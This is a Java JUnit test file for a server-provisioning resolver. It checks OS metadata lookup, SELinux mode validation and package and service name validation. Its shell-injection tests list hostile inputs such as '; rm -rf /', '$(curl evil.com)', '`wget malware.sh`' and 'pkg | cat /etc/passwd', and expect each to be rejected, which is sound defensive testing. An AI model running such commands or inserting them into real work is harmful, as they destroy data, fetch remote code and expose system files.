package com.example.serverprovision.application.setting.service.resolver;

import com.example.serverprovision.application.setting.model.OSSetting;
import com.example.serverprovision.application.setting.model.enums.SettingProcessStep;
import com.example.serverprovision.application.setting.model.request.AbstractProcessRequest;
import com.example.serverprovision.application.setting.model.request.OSSettingRequest;
import com.example.serverprovision.application.setting.model.request.RHELOSSettingRequest;
import com.example.serverprovision.domain.os.entity.OSMetadata;
import com.example.serverprovision.domain.os.model.enums.OSName;
import com.example.serverprovision.domain.os.model.enums.ServiceAction;
import com.example.serverprovision.domain.os.model.setting.RockyLinux9Setting;
import com.example.serverprovision.domain.os.model.setting.ServiceDirective;
import com.example.serverprovision.domain.os.repository.OSMetadataRepository;
import com.example.serverprovision.global.exception.FieldValidationException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.anyLong;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * OSSettingResolver 단위 테스트.
 *
 * <p>Resolver 는 {@link OSMetadataRepository} 조회 + {@code List<OSSettingBuilder>} 디스패치를
 * 오케스트레이션한다. SELinux 모드 허용값/패키지 이름 안전 검증은 {@link RHELOSSettingBuilder}
 * 내부로 이동했으므로, 여기서는 실제 RHEL 빌더를 주입하여 end-to-end 해상 경로를 함께 검증한다.</p>
 */
class OSSettingResolverTest {

    private OSMetadataRepository osMetadataRepository;
    private OSSettingResolver resolver;

    @BeforeEach
    void setUp() {
        osMetadataRepository = mock(OSMetadataRepository.class);
        resolver = new OSSettingResolver(
                osMetadataRepository,
                List.of(new RHELOSSettingBuilder())
        );

        // 기본 메타데이터: Rocky Linux 9.6 (id=1)
        OSMetadata rocky96 = OSMetadata.builder()
                .osName(OSName.ROCKY_LINUX)
                .osVersion("9.6")
                .isoMountPath("/mnt/iso/rocky9")
                .isEnabled(true)
                .build();
        when(osMetadataRepository.findById(1L)).thenReturn(Optional.of(rocky96));
    }

    private ServiceDirective enable(String name) {
        return new ServiceDirective(name, ServiceAction.ENABLE);
    }

    private ServiceDirective disable(String name) {
        return new ServiceDirective(name, ServiceAction.DISABLE);
    }

    @Nested
    @DisplayName("supports()")
    class SupportsTest {

        @Test
        @DisplayName("OSSettingRequest 서브타입은 true 반환")
        void returnsTrueForOSSettingRequest() {
            OSSettingRequest req = new RHELOSSettingRequest(1L, "enforcing", List.of(), List.of());
            assertThat(resolver.supports(req)).isTrue();
        }

        @Test
        @DisplayName("다른 AbstractProcessRequest 는 false 반환")
        void returnsFalseForOtherType() {
            AbstractProcessRequest other = new AbstractProcessRequest() {};
            assertThat(resolver.supports(other)).isFalse();
        }
    }

    @Nested
    @DisplayName("resolve() - 정상 케이스")
    class ResolveHappyPathTest {

        @Test
        @DisplayName("유효한 입력으로 OSSetting wrapper + 도메인 RockyLinux9Setting 생성")
        void createsWrapperWithRockyLinux9Setting() {
            RHELOSSettingRequest req = new RHELOSSettingRequest(
                    1L, "enforcing",
                    List.of(enable("httpd"), disable("cups")),
                    List.of("vim", "net-tools"));

            OSSetting result = (OSSetting) resolver.resolve(req);

            assertThat(result.getProcessStep()).isEqualTo(SettingProcessStep.OS_SETTING);
            assertThat(result.getOsMetadata().osName()).isEqualTo(OSName.ROCKY_LINUX);
            assertThat(result.getOsMetadata().osVersion()).isEqualTo("9.6");
            assertThat(result.getOsSetting()).isInstanceOf(RockyLinux9Setting.class);

            RockyLinux9Setting domain = (RockyLinux9Setting) result.getOsSetting();
            assertThat(domain.getSelinuxMode()).isEqualTo("enforcing");
            assertThat(domain.getServices()).containsExactly(
                    new ServiceDirective("httpd", ServiceAction.ENABLE),
                    new ServiceDirective("cups", ServiceAction.DISABLE)
            );
            assertThat(domain.getAdditionalPackages()).containsExactly("vim", "net-tools");
        }

        @ParameterizedTest
        @ValueSource(strings = {"enforcing", "permissive", "disabled"})
        @DisplayName("허용된 SELinux 모드는 모두 정상 처리된다")
        void acceptsAllValidSelinuxModes(String mode) {
            RHELOSSettingRequest req = new RHELOSSettingRequest(1L, mode, List.of(), List.of());
            OSSetting result = (OSSetting) resolver.resolve(req);
            RockyLinux9Setting domain = (RockyLinux9Setting) result.getOsSetting();
            assertThat(domain.getSelinuxMode()).isEqualTo(mode);
        }
    }

    @Nested
    @DisplayName("resolve() - 메타데이터/빌더 디스패치")
    class DispatchTest {

        @Test
        @DisplayName("존재하지 않는 osMetadataId 는 FieldValidationException(osMetadataId) 을 던진다")
        void throwsWhenMetadataNotFound() {
            when(osMetadataRepository.findById(anyLong())).thenReturn(Optional.empty());
            RHELOSSettingRequest req = new RHELOSSettingRequest(999L, "enforcing", List.of(), List.of());

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .satisfies(ex -> assertThat(((FieldValidationException) ex).getField())
                            .isEqualTo("osMetadataId"));
        }

        @Test
        @DisplayName("RHEL 계열 외 메타데이터(미지원 패밀리)는 osMetadataId 필드 예외로 승급된다")
        void throwsWhenNoMatchingBuilder() {
            // Ubuntu 메타데이터 — RHELOSSettingBuilder 의 supports() 가 false 반환.
            OSMetadata ubuntu = OSMetadata.builder()
                    .osName(OSName.UBUNTU)
                    .osVersion("22.04.5")
                    .isoMountPath("/mnt/iso/ubuntu22")
                    .isEnabled(true)
                    .build();
            when(osMetadataRepository.findById(2L)).thenReturn(Optional.of(ubuntu));
            RHELOSSettingRequest req = new RHELOSSettingRequest(2L, "enforcing", List.of(), List.of());

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .satisfies(ex -> assertThat(((FieldValidationException) ex).getField())
                            .isEqualTo("osMetadataId"));
        }
    }

    @Nested
    @DisplayName("resolve() - SELinux 모드 검증 실패")
    class SelinuxValidationTest {

        @Test
        @DisplayName("null selinuxMode 는 FieldValidationException(selinuxMode) 을 던진다")
        void throwsWhenSelinuxModeIsNull() {
            RHELOSSettingRequest req = new RHELOSSettingRequest(1L, null, List.of(), List.of());

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("SELinux");
        }

        @ParameterizedTest
        @ValueSource(strings = {"", "invalid", "ENFORCING", "Permissive", "on", "off"})
        @DisplayName("잘못된 selinuxMode 는 FieldValidationException 을 던진다")
        void throwsWhenSelinuxModeIsInvalid(String invalidMode) {
            RHELOSSettingRequest req = new RHELOSSettingRequest(1L, invalidMode, List.of(), List.of());

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("SELinux");
        }
    }

    @Nested
    @DisplayName("resolve() - Shell Injection 방어")
    class ShellInjectionTest {

        @ParameterizedTest
        @ValueSource(strings = {
                "; rm -rf /",
                "$(curl evil.com)",
                "`wget malware.sh`",
                "pkg && echo hacked",
                "pkg | cat /etc/passwd",
                "name with spaces",
                "../../../etc/passwd"
        })
        @DisplayName("악성 패키지명은 FieldValidationException 을 던진다")
        void rejectsShellInjectionInPackages(String malicious) {
            RHELOSSettingRequest req = new RHELOSSettingRequest(
                    1L, "enforcing", List.of(), List.of(malicious));

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("허용되지 않는 문자");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "; rm -rf /",
                "$(curl evil.com)",
                "pkg | cat /etc/passwd",
                "name with spaces"
        })
        @DisplayName("악성 서비스명은 FieldValidationException 을 던진다")
        void rejectsShellInjectionInServices(String malicious) {
            RHELOSSettingRequest req = new RHELOSSettingRequest(
                    1L, "enforcing", List.of(enable(malicious)), List.of());

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("허용되지 않는 문자");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "vim", "httpd", "sshd", "net-tools", "gcc-c++",
                "python3.11", "java-17-openjdk", "libstdc++"
        })
        @DisplayName("정상 패키지/서비스명은 허용된다")
        void acceptsSafeNames(String safe) {
            RHELOSSettingRequest req = new RHELOSSettingRequest(
                    1L, "enforcing", List.of(enable(safe)), List.of(safe));

            OSSetting result = (OSSetting) resolver.resolve(req);
            RockyLinux9Setting domain = (RockyLinux9Setting) result.getOsSetting();

            assertThat(domain.getServices()).contains(new ServiceDirective(safe, ServiceAction.ENABLE));
            assertThat(domain.getAdditionalPackages()).contains(safe);
        }

        @Test
        @DisplayName("악성 서비스 지시 예외 메시지에는 services[i].name 경로가 포함된다")
        void exceptionContainsServiceFieldIndex() {
            RHELOSSettingRequest req = new RHELOSSettingRequest(
                    1L, "enforcing",
                    List.of(enable("httpd"), disable("; rm -rf /")),
                    List.of());

            assertThatThrownBy(() -> resolver.resolve(req))
                    .isInstanceOf(FieldValidationException.class)
                    .satisfies(ex -> {
                        FieldValidationException fve = (FieldValidationException) ex;
                        assertThat(fve.getField()).isEqualTo("services[1].name");
                    });
        }
    }
}
